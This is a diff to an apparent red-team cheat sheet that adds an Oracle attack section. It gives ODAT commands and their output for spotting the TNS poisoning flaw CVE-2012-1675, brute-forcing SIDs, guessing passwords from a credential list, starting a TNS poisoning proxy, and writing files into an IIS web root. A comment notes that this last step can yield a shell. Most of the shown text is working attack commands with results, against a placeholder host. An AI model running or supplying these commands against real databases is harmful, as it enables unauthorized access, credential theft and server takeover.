@@ -6,6 +6,12 @@ hexorbase (no good)
 DBeaver (uptodate good)
 
 
+Database versions
+-----------------
+Mysql 8.0.1.8
+Mssql (2017 x64 RE/ubuntu/docker)
+Postgresql 12.0
+oracle 19c 
 
 #Connect to Microsoft SQL database
 /usr/bin/mssqlclient.py -p 1433 admin:m\@x.x.x.x
@@ -138,3 +144,80 @@ mysqld_safe --skip-grant-tables
 UPDATE mysql.user SET password=PASSWORD('password') WHERE user='root';
 mysqld start
 
+
+Oracle
+-----
+
+
+#Login 
+#XE is system identifier of database
+sqlplus username/password@x.x.x.x:1521/XE
+
+ERROR:
+ORA-28002: the password will expire within 7 days
+
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+SQL> 
+
+
+
+#ODAT Check against all modules
+python2.7 odat.py all -s x.x.x.x -d XE -U test -P test
+
+[1] (x.x.x.x:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
+[+] The target is vulnerable to a remote TNS poisoning
+
+[2] (x.x.x.x:1521): Testing all modules on the XE SID with the test/test account
+[-] Impossible to connect to the remote database: `ORA-01017: invalid username/password; logon denied`
+
+
+
+#System Identifier guesser
+python2.7 odat.py sidguesser -s x.x.x.x
+
+[1] (x.x.x.x:1521): Searching valid SIDs
+[1.1] Searching valid SIDs thanks to a well known SID list on the x.x.x.x:1521 server
+ 12% |######                                                   | ETA:  00:03:54 
+
+[+] 'XE' is a valid SID. Continue...                                            
+[+] 'XEXDB' is a valid SID. Continue...                                         
+100% |#########################################################| Time: 00:04:37 
+[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (x.x.x.x:1521)
+100% |#########################################################| Time: 00:00:08 
+[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (x.x.x.x:1521)
+[+] 'XE' is a valid SID. Continue...                                            
+
+100% |#########################################################| Time: 00:04:10 
+[+] SIDs found on the x.x.x.x:1521 server: XE,XEXDB
+
+
+
+#checks against passwords/accounts odat location (can change to file)
+python2.7 odat.py passwordguesser -s x.x.x.x -d XE -v
+
+[1] (x.x.x.x:1521): Searching valid accounts on the x.x.x.x server, port 1521
+18:38:24 INFO -: Loading accounts stored in the accounts/accounts.txt file
+18:38:24 INFO -: 491 paired login/password loaded
+18:38:24 INFO -: Searching valid accounts on x.x.x.x:1521/XE
+ 13% |#######                                                  | ETA:  00:25:33 
+ 26% |##############                                           | ETA:  00:15:59 
+
+
+
+#If someone connects and its vulnerable can poison
+python2.7 odat.py tnspoison -s x.x.x.x -d XE --poison
+
+[1] (x.x.x.x:1521): Local proxy on port 1522 and TNS poisoning attack to x.x.x.x:1521 are starting. Waiting for connections...
+
+
+
+#File upload
+#If you can write to and exec you can get shell
+#Either by uploading to IIS (aspx) or local file then executing
+python2.7 odat.py utlfile -s x.x.x.x -d XE -U username -P password --sysdba --putFile "C:\\inetpub\\wwwroot\\" test.txt ~/test.txt
+
+[1] (x.x.x.x:1521): Put the /home/RedTeam/test.txt local file in the C:\inetpub\wwwroot\ folder like test.txt on the x.x.x.x server
+[+] The /home/RedTeam/test.txt file was created on the C:\inetpub\wwwroot\ directory on the x.x.x.x server like the test.txt file
